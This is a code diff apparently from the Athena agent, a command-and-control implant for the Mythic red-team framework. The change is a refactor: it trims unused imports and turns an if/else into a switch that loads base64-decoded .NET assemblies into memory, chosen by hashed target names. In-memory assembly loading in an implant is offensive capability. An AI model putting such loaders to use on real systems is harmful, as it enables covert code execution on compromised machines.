@@ -3,18 +3,11 @@ using Athena.Models.Athena.Commands;
 using Athena.Models.Athena.Assembly;
 using Athena.Models.Mythic.Tasks;
 using Athena.Utilities;
-using System;
 using System.Collections.Concurrent;
-using System.Collections.Generic;
-using System.IO;
 using System.Reflection;
 using System.Runtime.Loader;
-using System.Threading.Tasks;
 using Athena.Plugins;
 using Athena.Models;
-using System.Linq;
-using System.Data;
-using System.Windows.Input;
 using System.Text.Json;
 
 namespace Athena.Commands
@@ -70,25 +63,25 @@ namespace Athena.Commands
 
             try
             {
+                switch (la.target.ToHash())
+                {
+                    case "A24BCF2198B1B13AD985304483F7F324":
+                        this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(la.asm)));
+                        break;
+                    case "6A21B6995A068148BBB65C8F949B3FB2":
+                        this.executeAssemblyContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(la.asm)));
+                        break;
+                    default:
+                        return new ResponseResult
+                        {
+                            task_id = job.task.id,
+                            user_output = "Invalid target specified",
+                            completed = "true",
+                            status = "error"
+                        }.ToJson();
 
-                if (la.target.IsEqualTo("A24BCF2198B1B13AD985304483F7F324")) //plugin
-                {
-                    this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(la.asm)));
                 }
-                else if (la.target.IsEqualTo("6A21B6995A068148BBB65C8F949B3FB2")) //external
-                {
-                    this.executeAssemblyContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(la.asm)));
-                }
-                else
-                {
-                    return new ResponseResult
-                    {
-                        task_id = job.task.id,
-                        user_output = "Invalid target specified",
-                        completed = "true",
-                        status = "error"
-                    }.ToJson();
-                }
+
                 //Return true if success
                 return new ResponseResult
                 {
@@ -209,10 +202,7 @@ namespace Athena.Commands
                 }.ToJson();
             }
         }
-        
-        
-        
-        
+           
         /// <summary>
         /// Load a command into the command execution context
         /// </summary>
@@ -347,8 +337,6 @@ namespace Athena.Commands
 
         public async Task<string> UnloadCommands(MythicJob job)
         {
-            //LoadCommand command = JsonSerializer.Deserialize<LoadCommand>(job.task.parameters);
-
             List<CommandsResponse> unloaded = new List<CommandsResponse>();
 
             return new LoadCommandResponseResult()
